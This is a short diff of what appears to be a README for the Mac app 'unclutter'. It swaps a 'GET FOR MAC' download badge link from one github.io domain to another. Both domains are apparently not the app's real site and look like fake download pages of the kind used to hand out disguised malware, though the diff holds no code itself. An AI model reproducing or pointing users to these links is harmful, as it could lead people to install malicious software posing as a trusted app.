@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://get-install-osx.github.io/.github/unclutter" target="_blank">  
+<a href="https://mac-software-apps.github.io/.github/unclutter" target="_blank">  
   <img src="https://img.shields.io/badge/GET%20FOR%20MAC-%F0%9F%8E%81-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get for Mac">  
 </a>  
 </div>  
